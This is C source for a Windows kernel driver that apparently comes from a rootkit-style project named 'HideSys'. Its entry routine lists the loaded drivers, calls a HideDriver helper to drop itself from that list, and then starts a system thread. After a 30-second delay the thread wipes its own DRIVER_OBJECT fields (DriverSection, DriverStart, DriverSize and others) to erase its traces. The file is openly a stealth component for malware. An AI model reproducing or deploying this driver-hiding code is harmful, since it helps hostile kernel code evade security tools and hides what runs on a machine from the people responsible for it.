#pragma once
#include "mscc.h"


VOID
DriverUnload(PDRIVER_OBJECT driverObject)
{
	DbgPrint("Unload Driver!!!!!!!!");
}

HANDLE hThread = NULL;

VOID threadProc(PVOID StartContext)
{
	LARGE_INTEGER sleepTime;
	sleepTime.QuadPart = -30 * 1000 * 1000;
	KeDelayExecutionThread(KernelMode, FALSE, &sleepTime);

	PDRIVER_OBJECT pDriver = (PDRIVER_OBJECT)StartContext;
	pDriver->DriverSize = 0;
	pDriver->DriverSection = NULL;
	pDriver->DriverExtension = NULL;
	pDriver->DriverStart = NULL;
	pDriver->DriverInit = NULL;
	pDriver->FastIoDispatch = NULL;
	pDriver->DriverStartIo = NULL;
	ZwClose(hThread);
}


NTSTATUS
DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	EnumLoadDriverName();

	HideDriver(DriverObject, "HideSys.sys");

	EnumLoadDriverName();
	DriverObject->DriverUnload = DriverUnload;

	NTSTATUS status = PsCreateSystemThread(&hThread, GENERIC_ALL, NULL, NULL, NULL, threadProc, DriverObject);

	if (!NT_SUCCESS(status))
	{
		DbgPrint("[MSCC] : PsCreateSystemThread failer!\n");
		return status;
	}



	return STATUS_SUCCESS;
}

